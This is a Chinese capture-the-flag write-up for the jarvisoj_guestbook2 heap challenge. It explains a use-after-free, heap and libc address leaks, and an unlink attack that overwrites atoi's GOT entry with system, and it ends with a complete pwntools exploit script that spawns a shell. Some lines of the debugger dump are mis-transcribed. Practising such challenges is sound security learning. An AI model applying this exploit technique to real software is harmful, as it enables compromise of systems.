# jarvisoj_guestbook2

学完最新的几个house系列感觉基础不太好就在学习一下栈堆，

## 程序分析

> 就是一个菜单题，有一个uaf，版本是2.23，而且可以修改got表，就打一个unlink，修改atoi的got表

```
[*] '/root/AutoExpMarkDocker-v3/data/jarvisoj_guestbook2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

在程序开始前申请一个大chunk用来存放接下来申请的chunk的标志位，地址，大小

```c
_QWORD *sub_400A49()
{
  _QWORD *result; // rax
  int i; // [rsp+Ch] [rbp-4h]

  qword_6020A8 = (__int64)malloc(0x1810u);
  *(_QWORD *)qword_6020A8 = 256;
  result = (_QWORD *)qword_6020A8;
  *(_QWORD *)(qword_6020A8 + 8) = 0;
  for ( i = 0; i <= 255; ++i )
  {
    *(_QWORD *)(qword_6020A8 + 24LL * i + 16) = 0;
    *(_QWORD *)(qword_6020A8 + 24LL * i + 24) = 0;
    result = (_QWORD *)(qword_6020A8 + 24LL * i + 32);
    *result = 0;
  }
  return result;
}
```

main函数有四个功能，增，改，读，删（申请最小的是0x80）

```c
__int64 sub_400998()
{
  puts("== PCTF GuestBook ==");
  puts("1. List Post");
  puts("2. New Post");
  puts("3. Edit Post");
  puts("4. Delete Post");
  puts("5. Exit");
  puts("====================");
  printf("Your choice: ");
  return sub_40094E();
}
```

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_4009FD(a1, a2, a3);
  sub_400A49();
  while ( 1 )
  {
    switch ( (unsigned int)sub_400998() )
    {
      case 1u:
        sub_400B14();
        break;
      case 2u:
        sub_400BC2();
        break;
      case 3u:
        sub_400D87();
        break;
      case 4u:
        sub_400F7D();
        break;
      case 5u:
        puts("Bye");
        return 0;
      default:
        puts("Invalid!");
        break;
    }
  }
}
```

## 漏洞利用
首先泄露出lib地和堆地址

在show中他用的printf参数是%s,这个参数是遇到\x00被截断,再加上这个show是打印所有的，我们就可以先释放两个chunk进入unsorted bin中记住这两个chunk不能相连要不然就会合并了。也要不能和top chunk合并

```
add 0x80 0x80*b'a'

add 0x80 0x80*b'b'

add 0x80 0x80*b'c'

add 0x80 0x80*b'd'
```

接下来就是打一个unlink，说实话我忘得差不多了，又学一边。大概意思就是利用溢出或者uaf在向高地址的chunk1中编辑或者写入的时候自己伪造一个chunk2这个chunk伪造是由要求的他的pri_size的大小等于chunk1-chunk2，因为在unlink是通过减pri_size来找到上一个被释放的chunk的地址，size位的最后一个字节是0表示上一个chunk处于释放状态，同时必须存在指向chunk2的指针，这也是为什么要uaf或者溢出了

看一下堆的变化

```
pwndbg> x/60gx 0x22f3820
0x22f3820: 0x0000000000000000  0x0000000000000191   //从这个chunk开始写入
0x22f3830: 0x0000000000000000  0x0000000000000081
0x22f3830: 0x00000000022f2018  0x00000000022f2020
0x22f3850: 0x6161616161616161  0x6161616161616161
0x22f3860: 0x6161616161616161  0x6161616161616161
0x22f3870: 0x6161616161616161  0x6161616161616161
0x22f3880: 0x6161616161616161  0x6161616161616161
0x22f3890: 0x6161616161616161  0x6161616161616161
0x22f38a0: 0x6161616161616161  0x6161616161616161

0x22f38b0: 0x0000000000000080  0x0000000000000090   //伪造的chunk
0x22f38c0: 0x6161616161616161  0x6161616161616161
0x22f38d0: 0x6161616161616161  0x6161616161616161
0x22f38e0: 0x6161616161616161  0x6161616161616161
0x22f38f0: 0x6161616161616161  0x6161616161616161
0x22f3900: 0x6161616161616161  0x6161616161616161
0x22f3910: 0x6161616161616161  0x6161616161616161
0x22f3920: 0x6161616161616161  0x6161616161616161
0x22f3930: 0x6161616161616161  0x6161616161616161

0x22f3940: 0x0000000000000000  0x0000000000000071
0x22f3950: 0x7777777777777777  0x00007f1d23fd5b78
0x22f3960: 0x6363636363636363  636363636363636363
0x22f3970: 0x6363636363636363  636363636363636363
0x22f3980: 0x6363636363636363  636363636363636363
0x22f3990: 0x6363636363636363  636363636363636363
0x22f39a0: 0x6363636363636363  636363636363636363
0x22f39b0: 0x6363636363636363  636363636363636363
0x22f39c0: 0x6363636363636363  636363636363636363
0x22f39d0: 0x00000000000001b0  0x0000000000000090
0x22f39e0: 0x6464646464646464  646464646464646464
0x22f39f0: 0x6464646464646464  646464646464646464
```


## exp
```python
from tools import*
p,e,libc=load('a')

context.log_level='debug'
def new(size,context):
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter("Length of new post: ",str(size))
    p.sendafter('Enter your post: ',context)
def list():
    p.sendlineafter('Your choice: ','1')
def edit(index,size,context):
    p.sendlineafter('Your choice: ','3')
    p.sendlineafter('Post number: ',str(index))
    p.sendlineafter('Length of post: ',str(size))
    p.sendafter('Enter your post: ',context)
def delete(index):
    p.sendlineafter('Your choice: ','4')
    p.sendlineafter('Post number: ',str(index))

new(0x80,0x80*'a') #0
new(0x80,0x80*'b') #1
new(0x80,0x80*'c') #2
new(0x80,0x80*'d') #3

delete(0)
delete(2)
new(8,8*'x')
new(8,8*'w')

list()
p.recvuntil('xxxxxxxx')
heap=u64(p.recv(4).ljust(8,b'\x00'))
log_addr('heap')
p.recvuntil('wwwwwwww')
libc_base=u64(p.recv(6).ljust(8,b'\x00'))-0x3c3b78 #0x3c4b78  #
sys_addr=libc_base+libc.symbols['system']#0x45380  0x0000000000045390#
log_addr('libc_base')
delete(0)
delete(1)
delete(2)
delete(3)
ptr=heap-0x1910
log_addr('ptr')
debug(p,0x400CA5,0x40106A,0x400B96)     
payload=p64(0)+p64(0x81)+p64(ptr-0x18)+p64(ptr-0x10)
payload=payload.ljust(0x80,b'a')
payload+=p64(0x80)+p64(0x90)
payload+=b'a'*0x80+p64(0x0)+p64(0x71)   
new(len(payload),payload)
delete(1)
payload=p64(0)+p64(1)+p64(0x8)+p64(e.got['atoi'])
edit(0,0x120,payload.ljust(0x120,b'a'))
edit(0,8,p64(sys_addr))
p.sendlineafter('Your choice: ',b'/bin/sh\x00')
p.interactive()
```